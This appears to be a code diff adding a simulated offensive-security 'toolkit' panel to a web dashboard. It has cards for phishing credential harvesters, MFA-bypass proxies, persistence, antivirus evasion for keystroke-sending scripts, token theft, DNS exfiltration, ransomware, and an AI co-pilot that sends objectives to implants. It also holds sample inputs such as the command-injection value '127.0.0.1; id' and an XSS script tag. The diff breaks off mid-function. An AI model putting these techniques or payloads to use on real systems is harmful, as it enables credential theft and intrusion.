@@ -256,12 +256,154 @@
             display: flex;
             justify-content: space-between;
         }
+
         .feed-title .blinking-cursor {
             animation: blink 1s step-end infinite;
         }
         @keyframes blink { 50% { opacity: 0; } }
 
-        /* Keylogger active section */
+        /* Cyber-Ops Toolkit layout styling */
+        .toolkit-container {
+            display: grid;
+            grid-template-columns: 280px 1fr;
+            gap: 25px;
+            margin-top: 40px;
+            border: 1px solid rgba(0, 255, 65, 0.15);
+            background: rgba(5, 5, 5, 0.85);
+            padding: 20px;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.9);
+            border-radius: 4px;
+        }
+        .toolkit-sidebar {
+            border-right: 1px solid rgba(0, 255, 65, 0.15);
+            padding-right: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            max-height: 700px;
+            overflow-y: auto;
+        }
+        .toolkit-nav-item {
+            background: rgba(10, 10, 10, 0.9);
+            border: 1px solid rgba(0, 255, 65, 0.1);
+            color: #888;
+            padding: 12px 15px;
+            text-align: left;
+            font-size: 12px;
+            letter-spacing: 1px;
+            transition: all 0.3s;
+            cursor: pointer;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .toolkit-nav-item i {
+            margin-right: 10px;
+            font-size: 14px;
+        }
+        .toolkit-nav-item:hover, .toolkit-nav-item.active {
+            background: rgba(0, 255, 65, 0.05);
+            border-color: var(--neon-green);
+            color: var(--neon-green);
+            box-shadow: inset 0 0 10px rgba(0, 255, 65, 0.1);
+        }
+        .toolkit-nav-item.active {
+            color: #fff;
+            font-weight: bold;
+            border-left: 3px solid var(--neon-green);
+        }
+        .toolkit-viewport {
+            padding: 10px;
+            max-height: 700px;
+            overflow-y: auto;
+        }
+        .toolkit-glass-card {
+            background: rgba(10, 10, 10, 0.95);
+            border: 1px solid #222;
+            border-left: 3px solid var(--cyber-blue);
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+        .toolkit-glass-card.threat-card {
+            border-left-color: var(--alert-red);
+        }
+        .toolkit-glass-card.success-card {
+            border-left-color: var(--neon-green);
+        }
+        .toolkit-input {
+            width: 100%;
+            background: #000;
+            border: 1px solid #333;
+            color: var(--neon-green);
+            font-family: 'Courier New', monospace;
+            padding: 10px;
+            margin: 10px 0;
+            outline: none;
+            font-size: 13px;
+        }
+        .toolkit-input::placeholder {
+            color: #555;
+        }
+        .toolkit-btn {
+            background: transparent;
+            border: 1px solid var(--neon-green);
+            color: var(--neon-green);
+            padding: 8px 20px;
+            font-family: inherit;
+            cursor: pointer;
+            font-size: 12px;
+            letter-spacing: 1px;
+            transition: all 0.3s;
+            text-transform: uppercase;
+        }
+        .toolkit-btn:hover {
+            background: var(--neon-green);
+            color: #000;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
+        }
+        .toolkit-btn-secondary {
+            border-color: var(--cyber-blue);
+            color: var(--cyber-blue);
+        }
+        .toolkit-btn-secondary:hover {
+            background: var(--cyber-blue);
+            color: #000;
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.4);
+        }
+        .toolkit-btn-danger {
+            border-color: var(--alert-red);
+            color: var(--alert-red);
+        }
+        .toolkit-btn-danger:hover {
+            background: var(--alert-red);
+            color: #fff;
+            box-shadow: 0 0 15px rgba(255, 0, 60, 0.4);
+        }
+        .toolkit-badge {
+            font-size: 9px;
+            letter-spacing: 1px;
+            padding: 2px 8px;
+            border-radius: 2px;
+            text-transform: uppercase;
+        }
+        .toolkit-badge-danger {
+            background: rgba(255, 0, 60, 0.1);
+            border: 1px solid var(--alert-red);
+            color: var(--alert-red);
+        }
+        .toolkit-badge-success {
+            background: rgba(0, 255, 65, 0.1);
+            border: 1px solid var(--neon-green);
+            color: var(--neon-green);
+        }
+        .toolkit-badge-info {
+            background: rgba(0, 240, 255, 0.1);
+            border: 1px solid var(--cyber-blue);
+            color: var(--cyber-blue);
+        }
+
         .keylogger-panel {
             margin-bottom: 30px;
             border-left: 2px solid var(--neon-green);
@@ -666,6 +808,94 @@
             {% endfor %}
             </div>
 
+
+        </div>
+    </div>
+
+    <!-- ============================================================== -->
+    <!-- NEW PREMIUM COMPONENT: CYBER-OPS TOOLKIT & ADAPTIVE SIMULATORS -->
+    <!-- ============================================================== -->
+    <div class="toolkit-container">
+        <!-- Sidebar Navigation (16 Professional Categories) -->
+        <div class="toolkit-sidebar">
+            <div style="font-size:12px; color:var(--cyber-blue); border-bottom:1px solid rgba(0,255,65,0.15); padding-bottom:8px; margin-bottom:5px; font-weight:bold; letter-spacing:1px;">
+                <i class="fa-solid fa-toolbox me-2"></i> ADAPTIVE OFFSEC TOOLS
+            </div>
+            <button class="toolkit-nav-item active" onclick="loadToolkitCategory('recon')">
+                <span><i class="fa-solid fa-search"></i> 01. OSINT Recon</span>
+                <span class="toolkit-badge toolkit-badge-info">Ready</span>
+            </button>
+            <button class="toolkit-nav-item" onclick="loadToolkitCategory('resource')">
+                <span><i class="fa-solid fa-server"></i> 02. Resource Dev</span>
+                <span class="toolkit-badge toolkit-badge-info">Ready</span>
+            </button>
+            <button class="toolkit-nav-item" onclick="loadToolkitCategory('initial')">
+                <span><i class="fa-solid fa-key"></i> 03. Initial Access</span>
+                <span class="toolkit-badge toolkit-badge-danger">Active</span>
+            </button>
+            <button class="toolkit-nav-item" onclick="loadToolkitCategory('execution')">
+                <span><i class="fa-solid fa-terminal"></i> 04. Execution</span>
+                <span class="toolkit-badge toolkit-badge-danger">Active</span>
+            </button>
+            <button class="toolkit-nav-item" onclick="loadToolkitCategory('persistence')">
+                <span><i class="fa-solid fa-clock"></i> 05. Persistence</span>
+                <span class="toolkit-badge toolkit-badge-info">Ready</span>
+            </button>
+            <button class="toolkit-nav-item" onclick="loadToolkitCategory('privesc')">
+                <span><i class="fa-solid fa-arrow-up"></i> 06. Privilege Esc</span>
+                <span class="toolkit-badge toolkit-badge-danger">Exploit</span>
+            </button>
+            <button class="toolkit-nav-item" onclick="loadToolkitCategory('evasion')">
+                <span><i class="fa-solid fa-user-secret"></i> 07. Defense Evasion</span>
+                <span class="toolkit-badge toolkit-badge-info">Ready</span>
+            </button>
+            <button class="toolkit-nav-item" onclick="loadToolkitCategory('credentials')">
+                <span><i class="fa-solid fa-fingerprint"></i> 08. Credential Access</span>
+                <span class="toolkit-badge toolkit-badge-success">Capture</span>
+            </button>
+            <button class="toolkit-nav-item" onclick="loadToolkitCategory('discovery')">
+                <span><i class="fa-solid fa-network-wired"></i> 09. Discovery</span>
+                <span class="toolkit-badge toolkit-badge-info">Ready</span>
+            </button>
+            <button class="toolkit-nav-item" onclick="loadToolkitCategory('lateral')">
+                <span><i class="fa-solid fa-route"></i> 10. Lateral Movement</span>
+                <span class="toolkit-badge toolkit-badge-danger">Exploit</span>
+            </button>
+            <button class="toolkit-nav-item" onclick="loadToolkitCategory('collection')">
+                <span><i class="fa-solid fa-download"></i> 11. Collection</span>
+                <span class="toolkit-badge toolkit-badge-success">Active</span>
+            </button>
+            <button class="toolkit-nav-item" onclick="loadToolkitCategory('c2')">
+                <span><i class="fa-solid fa-robot"></i> 12. Command & Control</span>
+                <span class="toolkit-badge toolkit-badge-success">Control</span>
+            </button>
+            <button class="toolkit-nav-item" onclick="loadToolkitCategory('exfiltration')">
+                <span><i class="fa-solid fa-upload"></i> 13. Exfiltration</span>
+                <span class="toolkit-badge toolkit-badge-danger">Exfil</span>
+            </button>
+            <button class="toolkit-nav-item" onclick="loadToolkitCategory('impact')">
+                <span><i class="fa-solid fa-circle-nodes"></i> 14. Impact & Destruct</span>
+                <span class="toolkit-badge toolkit-badge-danger">Danger</span>
+            </button>
+            <button class="toolkit-nav-item" onclick="loadToolkitCategory('forensics')">
+                <span><i class="fa-solid fa-shield-halved"></i> 15. Forensics Lab</span>
+                <span class="toolkit-badge toolkit-badge-info">Ready</span>
+            </button>
+            <button class="toolkit-nav-item" onclick="loadToolkitCategory('services')">
+                <span><i class="fa-solid fa-gear"></i> 16. Services Audit</span>
+                <span class="toolkit-badge toolkit-badge-info">Ready</span>
+            </button>
+        </div>
+
+        <!-- Dynamic Lab Viewport Content Area -->
+        <div class="toolkit-viewport">
+            <div style="border-bottom:1px solid rgba(0,255,65,0.15); padding-bottom:10px; margin-bottom:20px;">
+                <h4 id="toolkit-header-title" style="color:#fff; margin:0; letter-spacing:2px; font-weight:700;">01 - OSINT RECONNAISSANCE</h4>
+                <p id="toolkit-header-desc" style="color:#888; font-size:12px; margin:5px 0 0 0; text-transform:none;">Analyze email headers, verify domains, and perform metadata extraction.</p>
+            </div>
+            <div id="toolkit-viewport-container">
+                <!-- Dynamically Rendered Via loadToolkitCategory() JS -->
+            </div>
         </div>
     </div>
     
@@ -2086,6 +2316,780 @@
             options: { responsive: true, scales: { y: { ticks: { color: '#aaa' } }, x: { ticks: { color: '#aaa' } } }, plugins: { legend: { labels: { color: '#fff' } } } }
         });
     });
+
+    // ==============================================================
+    // NEW PREMIUM COMPONENT: ADAPTIVE CYBER-OPS TOOLKIT ENGINE
+    // ==============================================================
+    const toolkitCategories = {
+        recon: {
+            title: "01 - OSINT RECONNAISSANCE",
+            desc: "Analyze email headers, verify domains, and perform metadata extraction.",
+            labs: `
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-envelope-open text-info me-2"></i> Phishing Email Header Analyzer</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Paste complete headers to test validation alignment (SPF, DKIM, DMARC).</p>
+                    <textarea class="toolkit-input" rows="4" id="email-header-input" placeholder="Paste headers here..."></textarea>
+                    <div style="display:flex; gap:10px;">
+                        <button class="toolkit-btn" onclick="analyzeEmailHeader()">Analyze Header Alignment</button>
+                        <button class="toolkit-btn toolkit-btn-secondary" onclick="loadSampleHeader()">Load Spoofed Sample</button>
+                    </div>
+                    <div id="header-analysis-result" class="mt-3"></div>
+                </div>
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-image text-info me-2"></i> Metadata & EXIF Tool Extractor</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Simulate metadata scrubbing of uploaded payload images (JPG, PNG).</p>
+                    <input type="file" class="toolkit-input" id="exif-image-input" onchange="extractMetadata(this)">
+                    <div id="exif-analysis-result" class="mt-3"></div>
+                </div>
+            `
+        },
+        resource: {
+            title: "02 - RESOURCE DEVELOPMENT",
+            desc: "Register domains, spin up servers, and compile canary assets.",
+            labs: `
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-link text-info me-2"></i> IDN Homograph Conversion Sandbox</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Convert lookalike Unicode domains to standard ASCII Punycode (e.g. paypаl.com with Cyrillic 'а').</p>
+                    <input type="text" class="toolkit-input" id="idn-domain" value="paypаl.com">
+                    <button class="toolkit-btn" onclick="convertPunycode()">Verify Punycode IDN</button>
+                    <div id="idn-result" class="mt-3"></div>
+                </div>
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-bell text-info me-2"></i> Canary Honey-Tokens Generator</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Deploy honey-credentials inside config files. Any access triggers a silent alert back to J.A.R.V.I.S!</p>
+                    <button class="toolkit-btn" onclick="generateCanaryToken()">Deploy AWS Honey-Credentials</button>
+                    <div id="canary-result" class="mt-3"></div>
+                </div>
+            `
+        },
+        initial: {
+            title: "03 - INITIAL ACCESS VECTOR",
+            desc: "Simulate and design professional delivery components for penetration tests.",
+            labs: `
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-mask text-info me-2"></i> Session Cookie MFA Proxy Bypass</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Simulate an Adversary-in-the-Middle (AitM) proxy flow capturing secure session tokens bypass 2FA authentication.</p>
+                    <button class="toolkit-btn" onclick="simulateMfaBypass()">Spin Up Proxy Target Session</button>
+                    <div id="mfa-result" class="mt-3"></div>
+                </div>
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-code text-info me-2"></i> Phishing Campaign Payload Designer</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Design fully responsive, stunning credential harvester landing portals.</p>
+                    <select class="toolkit-input" id="phish-temp-select">
+                        <option value="google">Google Login Portal (Classic)</option>
+                        <option value="facebook">Facebook Account Harvester</option>
+                        <option value="office">Office 365 Outlook Suite</option>
+                    </select>
+                    <button class="toolkit-btn" onclick="testPhishTemplate()">Activate Payload Interface</button>
+                    <div id="phish-temp-result" class="mt-3"></div>
+                </div>
+            `
+        },
+        execution: {
+            title: "04 - EXECUTION PATHWAYS",
+            desc: "Audit server endpoints for deserialization flaws and injection vulnerabilities.",
+            labs: `
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-bug text-info me-2"></i> Insecure Deserialization (Ruby Object Injection)</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Exploit unsafe YAML load parameters to trigger remote code execution.</p>
+                    <button class="toolkit-btn toolkit-btn-danger" onclick="exploitDeserialization()">Execute Ruby Object Hijack</button>
+                    <div id="deserialization-result" class="mt-3"></div>
+                </div>
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-shield-cat text-info me-2"></i> Command Injection Sandbox</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Simulate sanitization bypass in network diagnostic command inputs.</p>
+                    <input type="text" class="toolkit-input" id="ping-target" value="127.0.0.1; id">
+                    <button class="toolkit-btn toolkit-btn-danger" onclick="runCommandInjection()">Audit System Target</button>
+                    <div id="injection-result" class="mt-3"></div>
+                </div>
+            `
+        },
+        persistence: {
+            title: "05 - PERSISTENCE MECHANISMS",
+            desc: "Register tasks, customize shell settings, and deploy autorun values.",
+            labs: `
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-clock-rotate-left text-info me-2"></i> Linux Cronjob Auto-Trigger Setup</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Deploy system health check backdoors using automatic cron intervals.</p>
+                    <button class="toolkit-btn" onclick="addCronjob()">Deploy Persistence Cronjob</button>
+                    <div id="cron-result" class="mt-3"></div>
+                </div>
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-window-restore text-info me-2"></i> Windows Registry Run Key Injector</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Write automatic key registry parameters inside mock systems for silent activation.</p>
+                    <button class="toolkit-btn" onclick="addRegistryKey()">Inject Registry Run Key</button>
+                    <div id="registry-result" class="mt-3"></div>
+                </div>
+            `
+        },
+        privesc: {
+            title: "06 - PRIVILEGE ESCALATION",
+            desc: "Leverage system misconfigurations and binary flags to spawn root terminals.",
+            labs: `
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-triangle-exclamation text-info me-2"></i> Tar Checkpoint Escalation</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Abuse wildcard parameters inside system backup scripts to execute privileged files.</p>
+                    <button class="toolkit-btn toolkit-btn-danger" onclick="triggerPrivEsc()">Trigger Backup Privilege escalation</button>
+                    <div id="privesc-result" class="mt-3"></div>
+                </div>
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-terminal text-info me-2"></i> SUID Binary Misconfiguration Sandbox</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Abuse setuid bits registered on standard commands (e.g. 'find') to spawn privileged root shells.</p>
+                    <button class="toolkit-btn toolkit-btn-danger" onclick="exploitSUID()">Exploit SUID Parameters</button>
+                    <div id="suid-result" class="mt-3"></div>
+                </div>
+            `
+        },
+        evasion: {
+            title: "07 - DEFENSE EVASION",
+            desc: "Obfuscate scripts, bypass WAF signature metrics, and bypass filters.",
+            labs: `
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-shield-halved text-info me-2"></i> WAF Signature Bypass Encoder</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Encode inputs (URL, HEX, Base64) to successfully slip past standard WAF filters.</p>
+                    <input type="text" class="toolkit-input" id="waf-payload" value="<script>alert(1)</script>">
+                    <div style="display:flex; gap:10px;">
+                        <button class="toolkit-btn" onclick="encodePayload('url')">URL Encode</button>
+                        <button class="toolkit-btn" onclick="encodePayload('hex')">HEX Encode</button>
+                        <button class="toolkit-btn" onclick="encodePayload('base64')">Base64 Encode</button>
+                    </div>
+                    <div id="waf-result" class="mt-3"></div>
+                </div>
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-filter text-info me-2"></i> Javascript Code Obfuscator Playground</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Obfuscate client keystroke-sending scripts to slip past client-side antiviruses.</p>
+                    <textarea class="toolkit-input" rows="3" id="js-code-obfuscate" placeholder='console.log("Hello Shohjahon!");'></textarea>
+                    <button class="toolkit-btn" onclick="obfuscateJSCode()">Generate Obfuscated Output</button>
+                    <div id="js-obfuscate-result" class="mt-3"></div>
+                </div>
+            `
+        },
+        credentials: {
+            title: "08 - CREDENTIAL ACCESS & KEYLOGGING",
+            desc: "Visualize keyboard dynamics and configure real-time streaming interfaces.",
+            labs: `
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-chart-line text-info me-2"></i> Dynamic Keystroke Biometrics Visualizer</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Type in the field below to visualize real-time Dwell Time (Flight dynamics) for behavioral analysis!</p>
+                    <input type="text" class="toolkit-input" id="biometrics-test-input" placeholder="Type keylogger tests here...">
+                    <div style="background:#000; border:1px solid #112; padding:15px; border-radius:4px; margin-top:15px;">
+                        <canvas id="keystrokeChart" height="120"></canvas>
+                    </div>
+                </div>
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-satellite-dish text-info me-2"></i> Live Keylogger Stream Simulator</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Simulate active connection states receiving instant updates from compromised clients.</p>
+                    <button class="toolkit-btn" onclick="startMockKeylogFeed()">Simulate Connection Stream</button>
+                    <div id="keylog-feed-result" class="mt-3"></div>
+                </div>
+            `
+        },
+        discovery: {
+            title: "09 - DISCOVERY & INTEL SCANNING",
+            desc: "Perform network surveys, audit targets, and fetch directory listings.",
+            labs: `
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-bullseye text-info me-2"></i> Network Port Scanner (Nmap Simulation)</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Map port alignments and running daemon versions of targets.</p>
+                    <input type="text" class="toolkit-input" id="scan-target" value="192.168.10.12">
+                    <button class="toolkit-btn" onclick="runPortScan()">Deploy Active Port Scan</button>
+                    <div id="scan-result" class="mt-3"></div>
+                </div>
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-folder-tree text-info me-2"></i> SNMP MIB Directory Walker</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Map standard device trees to discover system settings, users, and tokens.</p>
+                    <button class="toolkit-btn" onclick="walkSnmpMib()">Walk SNMP Directory</button>
+                    <div id="snmp-result" class="mt-3"></div>
+                </div>
+            `
+        },
+        lateral: {
+            title: "10 - LATERAL MOVEMENT",
+            desc: "Leverage credentials to jump between servers, processes, and assets.",
+            labs: `
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-stamp text-info me-2"></i> Pass-the-Hash (PtH) Token Injection</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Inject NTLM hashes inside system variables to launch remote command sessions.</p>
+                    <button class="toolkit-btn toolkit-btn-danger" onclick="triggerPtH()">Execute NTLM Hash Injection</button>
+                    <div id="pth-result" class="mt-3"></div>
+                </div>
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-desktop text-info me-2"></i> WinRM Shell Connection Simulator</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Establish administrative remote management consoles to push operational scripts.</p>
+                    <button class="toolkit-btn toolkit-btn-danger" onclick="simulateWinRMConnection()">Spin Up Remote Session</button>
+                    <div id="winrm-result" class="mt-3"></div>
+                </div>
+            `
+        },
+        collection: {
+            title: "11 - DATA COLLECTION SYSTEMS",
+            desc: "Harvest credentials, capture clipboard contents, and fetch local sessions.",
+            labs: `
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-copy text-info me-2"></i> Dynamic Clipboard Hijacker</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Simulate clipboard harvesting targeting system memory values.</p>
+                    <button class="toolkit-btn" onclick="readHackerClipboard()">Capture Clipboard Content</button>
+                    <div id="clip-result" class="mt-3"></div>
+                </div>
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-cookie text-info me-2"></i> HTML5 LocalStorage Token Dumper</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Scrub browser storage databases to steal keys and access tokens.</p>
+                    <button class="toolkit-btn" onclick="grabLocalStorage()">Audit LocalStorage Data</button>
+                    <div id="storage-result" class="mt-3"></div>
+                </div>
+            `
+        },
+        c2: {
+            title: "12 - COMMAND AND CONTROL (C2)",
+            desc: "Establish reliable channels back to platform implants and bots.",
+            labs: `
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-robot text-info me-2"></i> J.A.RV.I.S AI Cyber range Co-Pilot</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Send operational guidelines to automated implants.</p>
+                    <input type="text" class="toolkit-input" id="c2-instructions" value="Search database files for API tokens.">
+                    <button class="toolkit-btn" onclick="dispatchAICommand()">Dispatch System Objective</button>
+                    <div id="c2-result" class="mt-3"></div>
+                </div>
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-paper-plane text-info me-2"></i> Interactive Telegram Bot Simulator</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Control mock victim devices using telegram API systems.</p>
+                    <div id="telegram-chat" style="height: 120px; overflow-y: auto; background:#000; border:1px solid #112; padding:10px; font-family: monospace; font-size:12px; margin-bottom:10px;">
+                        <div style="color:#75715e;">[System]: Connection established.</div>
+                        <div style="color:#f8f8f2;">[Bot]: Cyber-Ops Operator active. Available: /status, /victim, /wipe.</div>
+                    </div>
+                    <div style="display:flex; gap:10px;">
+                        <input type="text" class="toolkit-input" style="margin:0;" id="tg-command" value="/status">
+                        <button class="toolkit-btn" onclick="sendTelegramCommand()">Post</button>
+                    </div>
+                </div>
+            `
+        },
+        exfiltration: {
+            title: "13 - EXFILTRATION CHANNELS",
+            desc: "Perform data packaging and bypass network exfiltration filters.",
+            labs: `
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-shield-cat text-info me-2"></i> DNS Tunneling Encoder</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Package sensitive data inside DNS queries to bypass egress security settings.</p>
+                    <input type="text" class="toolkit-input" id="exfil-data" value="AdminPass2026">
+                    <button class="toolkit-btn toolkit-btn-danger" onclick="encodeDnsTunnel()">Generate DNS Exfil Payload</button>
+                    <div id="exfil-result" class="mt-3"></div>
+                </div>
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-magnifying-glass-chart text-info me-2"></i> Telemetry & Data Exfiltration Analyzer</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Audit packet telemetry data (e.g. PCAP) to track tunneling patterns.</p>
+                    <button class="toolkit-btn" onclick="analyzePcapTelemetry()">Verify Telemetry PCAPs</button>
+                    <div id="pcap-result" class="mt-3"></div>
+                </div>
+            `
+        },
+        impact: {
+            title: "14 - SYSTEM IMPACT & DISRUPTION",
+            desc: "Test disaster recovery systems, emergency switches, and security parameters.",
+            labs: `
+                <div class="toolkit-glass-card">
+                    <h5 style="color:var(--alert-red);"><i class="fa-solid fa-radiation text-danger me-2"></i> Protocol Zero (Emergency Wipe Switch)</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Simulate self-destruct patterns targeting system databases to protect operational assets.</p>
+                    <button class="toolkit-btn toolkit-btn-danger" onclick="activateKillSwitch()">Execute System Wipe</button>
+                </div>
+                <div class="toolkit-glass-card">
+                    <h5 style="color:var(--alert-red);"><i class="fa-solid fa-lock text-danger me-2"></i> AES Cryptographic Ransomware Simulator</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Simulate robust local files encryption workflows for disaster preparedness studies.</p>
+                    <button class="toolkit-btn toolkit-btn-danger" onclick="runRansomwareSim()">Execute Encryption Pipeline</button>
+                    <div id="ransom-result" class="mt-3"></div>
+                </div>
+            `
+        },
+        forensics: {
+            title: "15 - FORENSICS & RECOVERY",
+            desc: "Compile static detection rules and test key recovery routines.",
+            labs: `
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-magnifying-glass-chart text-info me-2"></i> YARA Rule Developer Lab</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Verify rule compilation against simulated file parameters.</p>
+                    <textarea class="toolkit-input" rows="4" id="yara-rule-input" placeholder='rule Keylogger_Detection {\n  strings:\n    $a = "keylogger"\n  condition:\n    $a\n}'></textarea>
+                    <button class="toolkit-btn" onclick="testYaraRule()">Audit Signature Profile</button>
+                    <div id="yara-result" class="mt-3"></div>
+                </div>
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-unlock text-info me-2"></i> Cryptographic Key Recovery Lab</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Caesar/XOR decoding sandbox of database rows.</p>
+                    <div style="background:#050811; border:1px solid #112; padding:15px; border-radius:4px; font-family:monospace; font-size:12.5px; color:#aaa; margin-bottom:15px;">
+                        [+] Encrypted Target: <span class="text-warning">U1RFR0FOT0dSQVBIWQ==</span> (Hint: Base64)<br>
+                    </div>
+                    <input type="text" class="toolkit-input" id="decrypt-input" placeholder="Enter plaintext here...">
+                    <button class="toolkit-btn" onclick="decryptDbString()">Verify Recovered Key</button>
+                    <div id="decrypt-result" class="mt-3"></div>
+                </div>
+            `
+        },
+        services: {
+            title: "16 - SERVICES & POLICY AUDIT",
+            desc: "Audit services, configure custom system settings, and inspect vulnerabilities.",
+            labs: `
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-graduation-cap text-info me-2"></i> J.A.R.V.I.S Dynamic Scenario Generator</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Deploy dynamic challenge configurations with customized requirements.</p>
+                    <button class="toolkit-btn" onclick="generateDynamicScenario()">Deploy Dynamic Scenario</button>
+                    <div id="scenario-result" class="mt-3"></div>
+                </div>
+                <div class="toolkit-glass-card">
+                    <h5 style="color:#fff;"><i class="fa-solid fa-cookie-bite text-info me-2"></i> MFA & Session cookie protection policies</h5>
+                    <p style="color:#aaa; font-size:12.5px; text-transform:none;">Configure cookie flags (HttpOnly, Secure, SameSite) to protect credentials against script-harvesting attacks.</p>
+                    <div class="form-check mb-2">
+                        <input class="form-check-input" type="checkbox" id="cookie-httponly" checked>
+                        <label class="form-check-label text-white" for="cookie-httponly">Enable HttpOnly flag (Prevents JS token theft)</label>
+                    </div>
+                    <div class="form-check mb-3">
+                        <input class="form-check-input" type="checkbox" id="cookie-secure" checked>
+                        <label class="form-check-label text-white" for="cookie-secure">Enable Secure flag (Encrypts cookie transport over HTTPS)</label>
+                    </div>
+                    <button class="toolkit-btn" onclick="saveCookiePolicy()">Apply Session Policies</button>
+                    <div id="cookie-policy-result" class="mt-3"></div>
+                </div>
+            `
+        }
+    };
+
+    function loadToolkitCategory(key) {
+        document.querySelectorAll('.toolkit-nav-item').forEach(el => el.classList.remove('active'));
+        if (event && event.currentTarget) {
+            event.currentTarget.classList.add('active');
+        }
+
+        const cat = toolkitCategories[key];
+        document.getElementById('toolkit-header-title').innerText = cat.title;
+        document.getElementById('toolkit-header-desc').innerText = cat.desc;
+        document.getElementById('toolkit-viewport-container').innerHTML = cat.labs;
+
+        if (key === 'credentials') {
+            setTimeout(initKeystrokeChart, 300);
+        }
+    }
+
+    // Default load
+    document.addEventListener('DOMContentLoaded', () => {
+        loadToolkitCategory('recon');
+    });
+
+    // Dynamic Actions handlers
+    function loadSampleHeader() {
+        document.getElementById('email-header-input').value = 
+`Received: from mail.spoofedportal.com (192.168.10.45)\n` +
+`From: security@paypal.com\n` +
+`Subject: Account Suspended Immediately\n` +
+`SPF: fail (domain of paypal.com does not designate 192.168.10.45 as permitted sender)\n` +
+`DKIM: fail (signature verification failed)\n` +
+`DMARC: fail (action=quarantine)`;
+    }
+
+    function analyzeEmailHeader() {
+        const h = document.getElementById('email-header-input').value;
+        const res = document.getElementById('header-analysis-result');
+        if(!h) {
+            res.innerHTML = `<span class="toolkit-badge toolkit-badge-danger">Please input email headers</span>`;
+            return;
+        }
+        if(h.includes('SPF: fail') || h.includes('DKIM: fail')) {
+            res.innerHTML = `
+                <div style="background:rgba(255,0,60,0.1); border:1px solid var(--alert-red); padding:15px; border-radius:4px;">
+                    <span class="toolkit-badge toolkit-badge-danger mb-2"><i class="fa-solid fa-skull"></i> THREAT DETECTED: SPOOFED SENDER</span>
